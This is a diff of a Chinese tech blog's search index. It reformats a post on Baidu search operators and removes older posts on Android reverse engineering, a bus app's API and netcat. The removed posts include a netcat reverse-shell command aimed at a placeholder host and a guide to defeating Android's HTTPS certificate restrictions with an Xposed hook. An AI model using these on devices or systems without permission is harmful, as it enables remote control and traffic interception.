@@ -1,165 +1,1000 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[百度搜索常用高级命令整理]]></title>
-    <url>%2F2019%2F03%2F29%2Fbaidu-search-advanced%2F</url>
-    <content type="text"><![CDATA[本文适用于在无法使用其他搜索引擎时，不得已的情况下使用百度搜索，通过一些搜索技巧来获得更准确的搜索结果。在可以访问外网时，个人不推荐使用百度搜索。 这仅整理了适用于百度搜索的常用命令，并不是全部的。 默认情况下，百度会根据输入框中的内容，结合搜索引擎的语义分析，进行关键词拆分，以求做到更准确的结果匹配。在两个关键词之间插入空格，可以在一定程度上提高匹配的准确度。但有些情况下，这可能与用户所期望的目标背道而驰。 完全匹配 “北京到上海的火车票” 为搜索的关键词加上英文双引号，百度就会认为双引号里的是一个完整的词，将不会再进行分词。搜索出来的结果会是形如 北京到上海的火车票xxx，而不是 北京 和 上海 的 火车 有几列。 《三体》 搜索书籍类时同样可以给关键词加上书名号，效果与双引号是一样的。 排除关键词 哪家医院好 -baijiahao 用法是在关键词的后面加上英文减号 - ，再加上要排除的关键词，注意减号前面有个空格，减号后面没有空格。比如上面这段就会在搜索出的结果中排除百家号的内容。 关键词组合 (北京 | 南京) 形如 (A | B) 这种，搜索结果会要么包含 A，要么包含 B。上面的搜索结果中肯定会包含 北京 或 南京 两个关键词之一。（类似正则表达式） 关键词在网页标题中 title: 手机intitle: 手机 限定网页标题中必须出现 手机 这个关键词。 关键词在网页链接中 inurl: twitter 限定网址中必须出现 twitter 这个关键词。 站内搜索 site:weibo.sina.cn 新闻 把搜索范围限定在这个站点中，类似站内搜索。如果输入主域名会搜索包括子域名在内的所有匹配结果，也可以单独搜索子域名。但搜索出的结果一般不如站点自己提供的搜索全，这取决于百度对该站点链接的索引。 限定文件格式 filetype:doc 材料工程论文 搜索文件时用的，可以限定搜索结果中的文件格式，百度文库常用。 组合使用以上的这些搜索命令都是可以组合使用的。比如想要搜索百度文库中的某个文件，可以这样： site:wenku.baidu.com filetype:pdf 论文书写格式 最后，如果无法使用这些搜索命令，同样可以访问 百度高级搜索 页面来实现同样的效果。]]></content>
+    <title>百度搜索常用高级命令整理</title>
+    <url>/2019/03/29/baidu-search-advanced/</url>
+    <content><![CDATA[<p>本文适用于在无法使用其他搜索引擎时，不得已的情况下使用百度搜索，通过一些搜索技巧来获得更准确的搜索结果。在可以访问外网时，个人不推荐使用百度搜索。</p>
+<p>这仅整理了适用于百度搜索的常用命令，并不是全部的。</p>
+<p>默认情况下，百度会根据输入框中的内容，结合搜索引擎的语义分析，进行关键词拆分，以求做到更准确的结果匹配。在两个关键词之间插入空格，可以在一定程度上提高匹配的准确度。但有些情况下，这可能与用户所期望的目标背道而驰。</p>
+<a id="more"></a>
+
+<h3 id="完全匹配"><a href="#完全匹配" class="headerlink" title="完全匹配"></a>完全匹配</h3><blockquote>
+<p>“北京到上海的火车票”</p>
+</blockquote>
+<p>为搜索的关键词加上英文双引号，百度就会认为双引号里的是一个完整的词，将不会再进行分词。搜索出来的结果会是形如 <strong>北京到上海的火车票xxx</strong>，而不是 <strong>北京</strong> 和 <strong>上海</strong> 的 <strong>火车</strong> 有几列。</p>
+<blockquote>
+<p>《三体》</p>
+</blockquote>
+<p>搜索书籍类时同样可以给关键词加上书名号，效果与双引号是一样的。</p>
+<hr>
+<h3 id="排除关键词"><a href="#排除关键词" class="headerlink" title="排除关键词"></a>排除关键词</h3><blockquote>
+<p>哪家医院好 -baijiahao</p>
+</blockquote>
+<p>用法是在关键词的后面加上英文减号 <strong>-</strong> ，再加上要排除的关键词，注意减号前面有个空格，减号后面没有空格。比如上面这段就会在搜索出的结果中排除百家号的内容。</p>
+<hr>
+<h3 id="关键词组合"><a href="#关键词组合" class="headerlink" title="关键词组合"></a>关键词组合</h3><blockquote>
+<p>(北京 | 南京)</p>
+</blockquote>
+<p>形如 (A | B) 这种，搜索结果会要么包含 A，要么包含 B。上面的搜索结果中肯定会包含 <strong>北京</strong> 或 <strong>南京</strong> 两个关键词之一。（类似正则表达式）</p>
+<hr>
+<h3 id="关键词在网页标题中"><a href="#关键词在网页标题中" class="headerlink" title="关键词在网页标题中"></a>关键词在网页标题中</h3><blockquote>
+<p>title: 手机<br>intitle: 手机</p>
+</blockquote>
+<p>限定网页标题中必须出现 <strong>手机</strong> 这个关键词。</p>
+<hr>
+<h3 id="关键词在网页链接中"><a href="#关键词在网页链接中" class="headerlink" title="关键词在网页链接中"></a>关键词在网页链接中</h3><blockquote>
+<p>inurl: twitter</p>
+</blockquote>
+<p>限定网址中必须出现 <strong>twitter</strong> 这个关键词。</p>
+<hr>
+<h3 id="站内搜索"><a href="#站内搜索" class="headerlink" title="站内搜索"></a>站内搜索</h3><blockquote>
+<p>site:weibo.sina.cn 新闻</p>
+</blockquote>
+<p>把搜索范围限定在这个站点中，类似站内搜索。如果输入主域名会搜索包括子域名在内的所有匹配结果，也可以单独搜索子域名。但搜索出的结果一般不如站点自己提供的搜索全，这取决于百度对该站点链接的索引。</p>
+<hr>
+<h3 id="限定文件格式"><a href="#限定文件格式" class="headerlink" title="限定文件格式"></a>限定文件格式</h3><blockquote>
+<p>filetype:doc 材料工程论文</p>
+</blockquote>
+<p>搜索文件时用的，可以限定搜索结果中的文件格式，百度文库常用。</p>
+<hr>
+<h3 id="组合使用"><a href="#组合使用" class="headerlink" title="组合使用"></a>组合使用</h3><p>以上的这些搜索命令都是可以组合使用的。比如想要搜索百度文库中的某个文件，可以这样：</p>
+<blockquote>
+<p>site:wenku.baidu.com filetype:pdf 论文书写格式</p>
+</blockquote>
+<hr>
+<p>最后，如果无法使用这些搜索命令，同样可以访问 <a href="https://www.baidu.com/gaoji/advanced.html" title="百度高级搜索" target="_blank" rel="noopener">百度高级搜索</a> 页面来实现同样的效果。</p>
+]]></content>
       <tags>
         <tag>SEO</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[绕过 Android 7.0+ 网络安全配置]]></title>
-    <url>%2F2018%2F03%2F14%2Fnetwork-security-configuration-newer-than-android-n%2F</url>
-    <content type="text"><![CDATA[在 Android 7.0 以上的系统中，Google 引入了一种名为网络安全配置（Network Security Configuration）的功能。据官方文档所说，这个功能可以让开发者在一个安全的声明性 XML 配置文件中自定义应用的网络安全设置，而无需修改应用代码。也可以针对特定域和特定应用配置这些设置。可以参考官方文档原文https://developer.android.google.cn/training/articles/security-config.html 当然这篇文章并不是介绍 Network Security Configuration 的具体用法的，本篇文章主要讲如何绕过这种在 Android 7.0+ 的默认行为。 如果了解过相关的知识，对于这个新增的功能，最直观的感觉可能就是，在运行着 Android 7.0 的手机上无法使用 Fiddler 或类似工具抓到 https 连接的包了。只有一些 https 的握手请求，无法查看到实际的数据，根本原因就是应用不再信任用户导入的 Fiddler 证书了。 想要研究如何绕过这项功能，就必须先了解如何正常使用。据官方文档描述，需要在 res/xml 下创建一个 XML 文件来自定义网络配置：下面给出几个样例，可参照注释 配置该应用的所有 HTTPS 链接123456789&lt;?xml version="1.0"encoding="utf-8"?&gt;&lt;network-security-config&gt; &lt;base-config&gt; &lt;trust-anchors&gt; &lt;!-- 信任锚点集合 --&gt; &lt;certificates src="system"/&gt; &lt;!-- 信任系统自带的证书 --&gt; &lt;certificates src="user"/&gt; &lt;!-- 信任用户导入的证书 --&gt; &lt;/trust-anchors&gt; &lt;/base-config&gt;&lt;/network-security-config&gt; 配置该应用的自定义 CA12345678&lt;?xml version="1.0"encoding="utf-8"?&gt;&lt;network-security-config&gt; &lt;base-config&gt; &lt;trust-anchors&gt; &lt;certificates src="@raw/my_custom_ca"/&gt; &lt;!-- 放在 res/raw 下的自定义 CA 文件 --&gt; &lt;/trust-anchors&gt; &lt;/base-config&gt;&lt;/network-security-config&gt; 根据域名配置 HTTPS 可信域12345678910&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;network-security-config&gt; &lt;domain-config&gt; &lt;!-- 与上文的 base-config 不同 --&gt; &lt;domain includeSubdomains="true"&gt;example1.iacn.me&lt;/domain&gt; &lt;!-- 过滤域名，可配置多个 --&gt; &lt;domain includeSubdomains="true"&gt;example2.iacn.me&lt;/domain&gt; &lt;!-- 一般会将 CDN 配置在此 --&gt; &lt;trust-anchors&gt; &lt;certificates src="system"/&gt; &lt;/trust-anchors&gt; &lt;/domain-config&gt;&lt;/network-security-config&gt; 开发阶段的配置仅在 android:debuggable=”true” 时生效 12345678&lt;?xml version="1.0"encoding="utf-8"?&gt;&lt;network-security-config&gt; &lt;debug-overrides&gt; &lt;trust-anchors&gt; &lt;certificates src="system"/&gt; &lt;/trust-anchors&gt; &lt;/debug-overrides&gt;&lt;/network-security-config&gt; 除此之外，还需要在 AndroidManifest.xml 中引用自定义的网络安全配置 1234567&lt;?xml version="1.0"encoding="utf-8"?&gt;&lt;manifest&gt; &lt;application android:networkSecurityConfig="@xml/network_security_config" ...&gt; &lt;/application&gt;&lt;/manifest&gt; 上面是 Network Security Configuration 的使用简介，那么如何绕过该功能呢？ 重编译 APK 文件如上文介绍，需要将目标 APK 文件反编译，然后修改 XML 配置文件，在 trust-anchors 中信任用户导入的证书，之后重新打包即可。 运行时 Hook在某些情况下，第一种方法也许是不可行的。比如说，需要保留目标应用原始的签名文件。这是无法做到的，因为你不可能拿到开发者的原始证书去给重编译后的应用签名。这里就需要用到 Hook 技术，可以在不修改应用代码的前提下修改应用的行为。 查看 Android 7.1.2_r36 源码，android.security.net.config.ManifestConfigSource 类 用于加载和处理网络安全配置 XML 文件的相关信息getConfigSource() 方法下，如果应用未配置网络信息，它将会加载默认配置 12345678910111213141516171819202122public final class NetworkSecurityConfig &#123; ... private ConfigSource getConfigSource() &#123; ... ConfigSource source; if (mConfigResourceId != 0) &#123; ... source = new XmlConfigSource(mContext, mConfigResourceId, debugBuild, mTargetSdkVersion, mTargetSandboxVesrsion); &#125; else &#123; ... source = new DefaultConfigSource(usesCleartextTraffic, mTargetSdkVersion, mTargetSandboxVesrsion); &#125; mConfigSource = source; return mConfigSource; &#125;&#125; DefaultConfigSource 类是 ManifestConfigSource 类中一个内部类，即上文代码中返回的默认网络配置。 1234567891011121314151617public final class NetworkSecurityConfig &#123; ... private static final class DefaultConfigSource implements ConfigSource &#123; ... public DefaultConfigSource(boolean usesCleartextTraffic, int targetSdkVersion, int targetSandboxVesrsion) &#123; mDefaultConfig = NetworkSecurityConfig.getDefaultBuilder(targetSdkVersion, targetSandboxVesrsion) .setCleartextTrafficPermitted(usesCleartextTraffic) .build(); &#125; &#125;&#125; 在其构造方法中，调用了 android.security.net.config.NetworkSecurityConfig 类中的 getDefaultBuilder() 去构造一个默认配置。 1234567891011121314151617181920public final class NetworkSecurityConfig &#123; ... public static final Builder getDefaultBuilder(int targetSdkVersion, int targetSandboxVesrsion) &#123; Builder builder = new Builder() .setHstsEnforced(DEFAULT_HSTS_ENFORCED) .addCertificatesEntryRef( new CertificatesEntryRef(SystemCertificateSource.getInstance(), false)); ... if (targetSdkVersion &lt;= Build.VERSION_CODES.M) &#123; builder.addCertificatesEntryRef( new CertificatesEntryRef(UserCertificateSource.getInstance(), false)); &#125; return builder; &#125;&#125; 可以看到，在应用的 targetSdkVersion &lt;= M 时（Android 6.0 及以下），有一个 addCertificatesEntryRef(UserCertificateSource)，系统将默认信任用户导入的证书。 那么以 Xposed 为例，Hook getDefaultBuilder()，在调用前将第一个参数 targetSdkVersion 改为 Android N 以下就可以了。这里给出核心代码： 1234567891011public void initZygote(StartupParam startupParam) throws Throwable &#123; Class&lt;?&gt; targetClass = findClass("android.security.net.config.NetworkSecurityConfig", null); if (targetClass != null) &#123; XposedBridge.hookAllMethods(targetClass, "getDefaultBuilder", new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; param.args[0] = Build.VERSION_CODES.M; &#125; &#125;); &#125;&#125; 添加系统 CA 证书在上文中可以发现，应用是会默认信任系统证书的。那么我们也可以将自己的 CA 文件添加至系统。从 Charles 里导出二进制格式证书，但要使 Android 能够识别，还需要做一些转换，我们可以很方便的使用 openssl 工具来做到。 这里以导出的 cert.cer 证书文件为例。 1$ openssl x509 -inform DER -subject_hash_old -in cert.cer 执行该命令，并复制输出结果的第一行哈希字符串，后面会用。如下图所示。 1$ openssl x509 -inform DER -text -in cert.cer -out 7ef3ba8a.0 以刚才复制的哈希字符串为文件名，.0 结尾，如 7ef3ba8a.0，当做输出的文件名。执行后就会输出 7ef3ba8a.0 这个文件。 复制输出的文件到 Android 上 /system/etc/security/cacerts/ 这个目录下，644 权限。然后重启手机，你的证书就被添加到系统里了。]]></content>
-      <tags>
-        <tag>Android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[泉城公交开发手记（二） API分析]]></title>
-    <url>%2F2018%2F01%2F16%2Fjinan-bus-note2%2F</url>
-    <content type="text"><![CDATA[本文算是此系列的第一篇，我打算写写济南公交的服务端 API。当下的环境，基本每个应用都会具备联网请求数据的功能，公交客户端这种实时性很强的应用更是如此。既然我们打算做一个第三方客户端，那么第一步就是先要拿到各个车辆的实时数据。下面我会通过抓包来分析原版 369 出行的各个请求，关于抓包过程之前我也写过一篇文章介绍，这里就不多赘述了。 因为请求众多，这里只针对实际需要用到的数据进行说明，无用的类似请求广告图片什么的就不写了。 首次打开提示需要登录用户名，这部分其实是无用的。正常的流程会在用户登录时服务端返回一个 Token，后续请求会携带这个 Token。然而 369 出行的这个登录流程完全是无用的，登录的成功与否只是决定能不能进入下一个页面。还有一个值得吐槽的是整个登录流程用户名密码明文传输… 0. 参数说明向微步服务器的所有请求都需要在 Header 中加上 version 参数，值是版本号，示例version = android-insigma.waybook.jinan-2337，后面不再说明。 Json 返回的变量名，也是只说明一次的，后面重复的也不会再说明。 1. 首页GET –&gt; http://www.iwaybook.com/server-ue2/rest/servers-v2/370100 数据 说明 370100 济南市身份证号六位数字地址码 返回 12345678910111213&#123; "status": &#123; "code": 0 &#125;, "result": &#123; "id": 3, "name": "370100", "httpAddr": "60.216.101.229", "functions": "&#123;\"bus\":&#123;\"httpAddr\":\"60.216.101.229\",\"transfertype\":\"1\"&#125;&#125;", "state": 1, "useToken": false &#125;&#125; 变量 说明 httpAddr 下一步请求的服务器地址 GET –&gt; http://jinan.iwaybook.com/download/update.json 数据 说明 version 当前已安装的版本 返回 12345678910111213&#123; "status": &#123; "code": 0, "msg": "" &#125;, "result": &#123; "versionCode": 2337, "versionName": "3.3.7", "descriptions": ["1.增加了“车辆租赁”"], "must": false, "url": "http://60.216.101.229/download/jinan.apk" &#125;&#125; 变量 说明 versionCode 最新 versionCode versionName 最新 versionName descriptions 更新日志 must 如果为 true，会强制更新，不然无法进入。false 则不会 url 最新版本下载链接 2. 车辆搜索界面搜索界面的车辆相似查询 GET –&gt; http://60.216.101.229/server-ue2/rest/buslines/simple/370100/118/0/20 数据 说明 60.216.101.229 上文中请求获取到的 httpAddr，后续也是这个地址 118 路线编号 0 从第几个条目请求 20 请求多少个条目 返回 1234567891011121314151617181920212223242526&#123; "status": &#123; "code": 0, "msg": "" &#125;, "result": &#123; "pageParam": &#123; "offset": 0, "len": 20, "totalNum": 2 &#125;, "result": [&#123; "id": "223", "lineName": "118", "startStationName": "公交祝甸车场", "endStationName": "市立五院", "updateTime": "Sep 29, 2017 12:25:11 AM" &#125;, &#123; "id": "224", "lineName": "118", "startStationName": "市立五院", "endStationName": "公交祝甸车场", "updateTime": "Sep 29, 2017 12:25:31 AM" &#125;] &#125;&#125; 变量 说明 id 路线ID lineName 路线编号 startStationName 始发站 endStationName 终点站 updateTime 信息更新时间 这里需要注意同一路车的去程与返程是两个不同的 ID 3. 路线详情界面 GET –&gt; http://60.216.101.229/server-ue2/rest/buslines/370100/223 数据 说明 223 路线ID 返回 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&#123; "status": &#123; "code": 0, "msg": "" &#125;, "result": &#123; "id": "223", "area": 370100, "lineName": "118", "startStationName": "公交祝甸车场", "endStationName": "市立五院", "stations": [ &#123; "id": "1", "area": 370100, "stationName": "公交祝甸车场", "lng": 117.09900257524, "lat": 36.703679321059, "buslines": "", "state": "0", "updateTime": "Sep 29, 2017 12:25:11 AM", "distance": 0, "busLineList": [] &#125;, &#123; "id": "2", "area": 370100, "stationName": "祝甸", "lng": 117.09818542729, "lat": 36.701505610837, "buslines": "", "state": "0", "updateTime": "Sep 29, 2017 12:25:11 AM", "distance": 0, "busLineList": [] &#125; ... ... ], "ticketPrice": "票价一元", "operationTime": "祝甸5:30－00:00 市立五院", "owner": "", "linePoints": "117.09900257524_36.703679321059,117.09818542729_36.701505610837,117.09402184523_36.701017213509,117.09066994065_36.700634744005...", "updateTime": "Sep 29, 2017 12:25:11 AM", "state": "0" &#125;&#125; 变量 说明 stations 是一个 List。该路线所有站点的信息 stationName 站点名 lng 经度坐标 lat 纬度坐标 state 站点状态。0 可用，1 不可用 ticketPrice 票价 linePoints 所有站点的坐标。以下划线_分隔经度和纬度 该路线的所有站点会在 stations 中体现，stations 的大小就是该路线所有站点的数量。这里的 lng, lat 经纬度属于百度 BD09 坐标，后面会详细说明。linePoints 是一些字符串，所有站点的坐标。实际没什么用处，因为上文的 stations 中已经包含各个站点的信息了。 GET –&gt; http://60.216.101.229/server-ue2/rest/buses/busline/370100/223 返回 1234567891011121314151617181920212223242526272829303132333435363738&#123; "status": &#123; "code": 0, "msg": "" &#125;, "result": [&#123; "busId": "4635", "lng": 116.973701, "lat": 36.66398, "velocity": 22.883572962605573, "isArrvLft": "2", "stationSeqNum": 23, "status": "1", "buslineId": "223", "actTime": "Jan 16, 2018 03:50:04 PM", "cardId": "4635", "orgName": "", "averageVelocity": 9.565269318966328, "coordinate": 0 &#125;, &#123; "busId": "4631", "lng": 116.957313, "lat": 36.654813, "velocity": 50.211262538794415, "isArrvLft": "2", "stationSeqNum": 27, "status": "1", "buslineId": "223", "actTime": "Jan 16, 2018 03:49:54 PM", "cardId": "4631", "orgName": "", "averageVelocity": 9.178488660594233, "coordinate": 0 &#125; ... ... ]&#125; 变量 说明 busId 车辆自编号 stationSeqNum 即将到达第多少个站 actTime 最后活动时间 cardId 报站器ID averageVelocity 平均时速 busId 是该车的自编号，由济南公交公司分配，方便管理stationSeqNum 即将到达第几个站，参见上文的 stations这里的 lng, lat 经纬度属于地球 WGS-84 坐标 可以看到这里使用的坐标系统和上文中的不同，这里就简略介绍一下这几种坐标的区别。 WGS-84 坐标系，是国际标准坐标系。从专业 GPS 设备中取出的数据遵循这种坐标，也是国际地图提供商所使用的坐标系。 GCJ-02 坐标系，也叫国测局坐标系，又称火星坐标。是由中国国家测绘局指定的一种大地坐标系。会对原始坐标进行算法加密，加入随机偏移，隐藏真实位置。理论上不可逆推。国测局规定国内出版的各种地图系统（包括电子形式），必须至少采用 GCJ-02 对地理位置进行首次加密。 BD-09 坐标系，是百度公司的加密算法坐标系，同样是一种偏移算法。该算法不公开。据传是从 GCJ-02 加密而来，也不一定，也许直接从 WGS-84 转换而来也不得而知 这三种坐标系的互相转换，网上也有流传方法，但并不完美。 3. 公告界面 GET –&gt; http://60.216.101.229/server-ue2/rest/busAnnouncements/370100/all/0/20 返回 1234567891011121314151617181920212223242526&#123; "status": &#123; "code": 0, "msg": "" &#125;, "result": &#123; "pageParam": &#123; "offset": 0, "len": 20, "totalNum": 238 &#125;, "result": [&#123; "id": "ab9f877a737f42688cd16d73065cd39f", "area": 370100, "title": "1月13日起,140路调整部分运行路段", "content": "受蓝翔路道路施工影响，1月13日起，140路调整部分运行路段。\n\n140路调整后沿蓝翔中路向东、东宇大街向南、粟山路向东再向南、小清河北路向东恢复原线，新设时代总部基地西门、东宇花园、粟山路东宇大街、东沙王庄、粟山路黄岗路、王炉庄北、粟山路永鼎路站点，将王炉庄站点迁移至粟山路路口东侧，撤销蓝翔中路中段、蓝翔路蓝翔中路、时代总部基地、卢庄工业园、蓝翔路粟山路、北辛庄北、北辛庄站点。", "publisher": "济南市公共交通总公司", "updateTime": "Jan 11, 2018 03:51:21 PM", "state": "1", "valid": 1 &#125; ... ... ] &#125;&#125; 变量 说明 totalNum 全部公告数量 title 标题 content 内容 publisher 发布人 updateTime 发布时间 valid 是否可用 有了这些必要的信息，已经可以开始做一个第三方的客户端了。下一篇文章，将会详细介绍自定义线路图 View 的实现。]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[泉城公交开发手记（一） 说明]]></title>
-    <url>%2F2018%2F01%2F07%2Fjinan-bus-note1%2F</url>
-    <content type="text"><![CDATA[泉城公交是我在 2015 年的时候开发的一个济南公交第三方客户端，基本实现了原生济南公交客户端的部分功能。但出于一些原因，不得不停止更新。我将所有源代码开源在了 GitHub。然后有网友邮件询问相关问题，所以，我整理了一下以前开发时的一些笔记，整理成几篇文章发出来。 这几篇文章大概分为以下几个部分API 分析、通知模块实现、自定义线路图 View 等等，还有部分填坑的说明。路线规划不会写，因为这部分整个就是调用的百度离线地图 SDK。 如果时间充裕的话，可能还会写一写济南公交（微步、369出行）新版的 NFC 公交卡充值实现。 本系列文章仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与作者无关。]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[使用 Android Studio 动态调试 Smali 代码]]></title>
-    <url>%2F2017%2F09%2F29%2Fusing-AS-debug-smali-code%2F</url>
-    <content type="text"><![CDATA[0x1 准备一台可以正常运行 Android Studio / IDEA 的电脑一个顺手的 Smali 代码反编译工具smalidea 插件，可从 这里 获取，baksmali 工具也有你需要有一个目标 APK 文件，这里我新建的一个测试项目为例 0x2 开始 1234567891011121314151617public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void testClick(View view) &#123; // 方便测试，尽可能多用些中间变量 double radius = 15; double square = Math.pow(radius, 2); double area = Math.PI * square; Toast.makeText(this, String.valueOf(area), Toast.LENGTH_SHORT).show(); &#125;&#125; 打开 Android Studio，进入 File -&gt; Settings -&gt; Plugins，点击 Install plugin from disk 按钮，选择并安装 smalidea 插件 反编译源 apk 文件，生成 out 文件夹，然后从 Android Studio 的 File -&gt; New -&gt; Import Project，导入 out 文件夹，记得选择 Source Folder 成功导入后你就可以发现 Smali 代码的关键字已经可以高亮显示了 再次打开 Android Studio，点击 Run -&gt; Edit Configurations，新建 Remote 类型的调试器，如图 以调试模式在手机端或模拟器运行目标应用 adb shell am start -D -n me.iacn.testapplication/.MainActivity 此时目标应用会在打开时处于挂起状态，然后 adb shell ps 在其中找到以目标应用包名为 NAME 的一个进程，查看他的 PID adb forward tcp:6666 jdwp:5444 其中，forward 为刚才新建 Remote 调试器时所填的本地端口。jdwp 为在上面所查看的目标应用 PID。此种方式实际上是利用 Remote 调试器，通过本地端口 6666 连接手机调试目标应用 此时回到 Android Studio，下一个断点，然后 Run -&gt; debug Unnameed，稍等一会儿，就可以从 Debugger 面板里查看调试结果了 需要注意的是，有时寄存器的值不会直接在 Variables 面板里显示出来，需要将想要查看的变量添加到 Watch 中，然后在 Watch 面板中查看]]></content>
-      <tags>
-        <tag>Android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Linux 下 nc 命令的简单介绍]]></title>
-    <url>%2F2017%2F08%2F16%2Flinux-netcat%2F</url>
-    <content type="text"><![CDATA[nc 是 Linux 下的一个强大的命令。nc 是简称，全名是 netcat。大部分的 Linux 发行版都有自带 nc 这个命令，如果没有的话就需要自己安装了 我这里使用的是 CentOS 7.3，对于 nc，你可以使用 yum 安装或者自己编译二进制文件。这里推荐使用 yum 安装，因为 yum 可以自动解决依赖问题 1yum install nmap-ncat.x86_64 同样，netcat 也有 Windows 版本可用，你可以在 https://eternallybored.org/misc/netcat 这里下载到 netcat 的 Windows 版本。这里下载到的是一个压缩包，里面包含 netcat 的源代码和 nc &amp; nc64 两个已经编译好的二进制文件，你可以根据自己系统来选择使用 nc 或 nc64 成功安装之后你就可以使用 nc 命令了，使用 nc –help，你可以查看到 nc 命令的详细帮助。我在这里使用几个具体的例子来简要概述下 nc 命令的基本使用方法 0. nc 命令的标准使用形式1nc [-options] ip port[s] [ports] ip 处是可以使用域名的，nc 会调用 DNS 解析成 IP 地址。如果不需要 nc 自动解析的话可以在执行时添加 -n [–nodns] 参数 1. 两台主机之间发送实时消息12A 主机：nc -lp portB 主机：nc ip port -l [–listen]：绑定并监听传入的连接-p [–source-port]：指定要使用的源端口 建立连接后在任意一台主机输入信息并按下回车发送后对方就能收到因为 nc 是会自动从标准流中读取数据的，如果想要禁止，可以在命令执行时使用 -d 参数 2. 两台主机之间传送文件12接收端：nc -lp port &gt; outputfile发送端：nc destip port &lt; inputfile 这一条本质和上面那个是一样的，只是借用了输出重定向这个特性。同样，nc 命令也支持管道，你甚至可以借由此实现克隆分区： 1234567接收端：unmount /dev/sda2nc -lp port | dd of=/dev/sda2发送端：unmount /dev/sda1dd if=/dev/sda1 | nc destip port 3. 发送 HTTP 请求123456789$nc destip 80 &lt;&lt;EOFGET /HTTP/1.1Cookie:xxxxxx:xxxxxxEOF 为什么？因为 nc 发送的是纯文本保存 Web 页面？重定向输出流就好了 4. 反向代理 Shell12发送端：nc -lp localport执行端：nc -t -e C:/windows/system32/cmd.exe destip destport -t [–telnet]：响应 telnet 交互-e [–exec-command]：执行给定的命令，也可以携带一个 lua 脚本 destip 和 destport 即为发送端的 IP 和 localport连接成功后，发送端的会得到一个执行端的 Shell 你可以使用 -w 来设置无响应时的超时时间 nc 在默认情况下，如果连接到 Server 的 Client 断开连接，那么 Server 也会跟着退出。你可以使用 -k 参数来保持 Server 的监听状态 nc 是支持 IPV6 的，你可以使用 -4 &amp; -6 参数来指定使用 IPV4 或 IPV6 nc 默认是使用 TCP 协议通信，但是也支持 UDP，可添加 -u 参数来使用 UDP 协议 对于使用 nc 去扫描端口这个用途，我是不推荐的，因为 nc 的扫描速度十分之慢。而且，在最新的 nc 中，已经去掉了 -z &nbsp;&nbsp;&nbsp;(zero-I/O mode [used for scanning]) 这个参数。所以，对于这个需求，还是使用更专业的 nmap 吧]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[vShere Client 无法连接 vCenter 故障排查思路]]></title>
-    <url>%2F2017%2F07%2F14%2Fvsphere-server-problem-check%2F</url>
-    <content type="text"><![CDATA[问题如图所示，vSphere Client 弹框无法连接到 vCenter，只提示出现未知错误 这类问题一般不好排查，因为没有给出错误的具体信息，错误提示或者错误代码。我这里结合实例，总结一下该类问题的排查思路 1. 检查网络连接情况；检查 vCenter 的 IP，用户名，密码是否正确 这个在大多数出现在实验环境中，生产环境中一般不会出现这种错误解决办法也没什么好说的，ping 检查连接，用户名密码换成正确的 2. 检查 vCenter 的 Web Client 能否正常访问 vCenter 是可以从 Web 端访问管理的URL 是：https://client-hostname:port/vsphere-client默认情况下此端口为 9443，但可在 vSphere Web Client 安装过程中更改此端口 这里打开并输入正确的用户名密码，发现可以正常访问，说明 vCenter 整个本身是没有什么问题的 3. 检查 VMware VirtualCenter Server 服务是否已经启动 VMware VirtualCenter Server 是 vCenter 的核心服务，无法连接的原因大部分是因为这个服务没有启动使用 远程桌面 连接到 vCenter 所在的虚拟机，打开 服务器管理器 - 诊断 - 服务，找到这个服务，检查其状态 我所在的环境是一个 vCenter 虚拟机通过 Platform Services Controller 去管理多个安装了 VMWare ESXi 底机。由于所在环境出于安全起见，在 vCenter Server 安装时禁止了 vCenter 虚拟机的远程桌面权限，所以这里采用另一种方式跳转上去 由于 VMWare ESXi 底机是允许通过 vSphere Client 连接去管理单个的实体服务器的，而这种方式不需要依赖 VMware VirtualCenter Server 服务。所以我这里先连接 vCenter 虚拟机所在的那台实体服务器，再在其中打开控制台 打开后检查，发现这个服务确实是没有正常启动 4. VMware VirtualCenter Server 服务无法正常启动 一般来说，若是该服务没有启动，手动启用后便可恢复正常。但有些情况下无法手动启动，这时候就要结合具体情况来分析了vCenter Server 的正常运行是需要依赖数据库的，所以先应该检查数据库的相关服务有没有正常运行vCenter Server 在安装时是会将其核心服务设置为开机自启的。所以，如果在其启动时数据库服务没有正常运行，就会出现问题。我习惯的做法是将数据库相关服务的启动类型设置为 自动，而把 vCenter Server 相关服务设置为 自动（延迟启动），来保证数据库服务优于 vCenter Server 服务启动。 5. VMware VirtualCenter Server 服务正常启动了还是不能连接 通常情况下，vCenter Server，vCenter 依赖的数据库和其他业务服务都是分开机器安装的，但也有安装在一台虚拟机中的情况因为 vCenter Server 需要使用 80 端口，所以保证该端口的正常通信是必要的。可以使用 telnet 命令来检查端口是否已经开启，例如 telnet 10.100.100.14 80。如果不通，就要检查各防火墙的出入栈规则了另外 Web 服务也会占用 80 端口来进行通信，这个也要仔细甄别 关于 vCenter 服务的相关问题实在太多，这里只是整理了一些思路来帮助检查对于这种问题没有什么好办法，就是查看日志来找问题原因。]]></content>
-      <tags>
-        <tag>网络</tag>
-        <tag>vSphere</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Android 6.0 上的双卡相关开发]]></title>
-    <url>%2F2017%2F06%2F07%2Fmultisim-for-android-6-0%2F</url>
